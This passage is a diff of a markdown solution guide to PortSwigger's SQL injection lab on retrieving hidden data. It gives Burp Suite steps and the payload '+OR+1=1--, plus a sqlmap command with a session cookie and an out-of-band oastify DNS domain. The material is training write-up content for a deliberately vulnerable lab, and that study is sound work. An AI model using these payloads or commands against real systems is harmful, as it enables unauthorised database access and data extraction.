@@ -63,16 +63,17 @@ END
 
 ## Solution to PortSwigger Labs
 ### Lab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
-```
-This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application executes a SQL query like the following:
+Reference: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
-SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
+Quick Solution
+In this lab the payload is quite easy, the goal is to retrieve hidden items. See next section for the solution.
 
-To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
-```
-#### Steps to Exploit
-1. Attempt to break the SQL query by adding `'`, `"`, `[`, etc. (Refer to [SecLists - SQLi Fuzzing](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/SQLi/Generic-SQLi.txt))
-2. Use SQLMap to automate exploitation:
+Solution
+1. Use Burp Suite to intercept and modify the request that sets the product category filter.
+2. Modify the category parameter, giving it the value '+OR+1=1--
+3. Submit the request, and verify that the response now contains additional items.
+
+Use SQLMap to automate exploitation:
 ```sh
 sudo sqlmap -u 'https://0a7600f603ba54f885822399001d0005.web-security-academy.net:443/filter?category=Accessories*' \
 --cookie='session=ma2R4BBvX2qlhfa1rxLtomrI2mEf8WtS' --batch --dns-domain=pa3t9ag3m5yqdm6stxugb16nsey5mvak.oastify.com
